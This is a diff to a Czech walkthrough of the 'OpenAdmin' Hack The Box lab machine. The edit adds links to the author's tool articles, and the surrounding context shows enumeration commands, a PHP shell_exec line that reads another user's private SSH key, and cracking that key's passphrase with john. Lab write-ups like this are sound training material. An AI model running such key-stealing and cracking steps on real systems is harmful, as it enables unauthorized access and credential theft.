@@ -28,7 +28,7 @@ dirb http://openadmin.htb
 => DIRECTORY: http://openadmin.htb/music/
 ```
 
-Jakmile je `/ona/` nalezené, `whatweb` hned identifikuje OpenNetAdmin.
+Jakmile je `/ona/` nalezené, `whatweb` hned identifikuje OpenNetAdmin. Praktickou roli rychlého HTTP fingerprintingu rozebírám i v článku [WhatWeb](/nastroje/whatweb).
 ```bash
 whatweb http://openadmin.htb/ona/
 ```
@@ -76,7 +76,7 @@ ssh -L 52846:127.0.0.1:52846 jimmy@openadmin.htb
 echo "<?php echo shell_exec('cat /home/joanna/.ssh/id_rsa');" > /var/www/internal/key.php
 ```
 
-Stažený klíč je zašifrovaný, ale ve webu se zároveň objeví nápověda „Don't forget your "ninja" password“. To je dobrý hint pro `john` a výsledkem je passphrase `bloodninjas`.
+Stažený klíč je zašifrovaný, ale ve webu se zároveň objeví nápověda „Don't forget your "ninja" password“. To je dobrý hint pro `john` a výsledkem je passphrase `bloodninjas`. Praktickou roli `ssh2john` a podobných převodníků rozebírám i v článku [John the Ripper](/nastroje/john-the-ripper).
 ```bash
 /usr/share/john/ssh2john.py OpenAdmin_joanna_id_rsa > OpenAdmin_joanna_id_rsa.john
 /usr/sbin/john OpenAdmin_joanna_id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
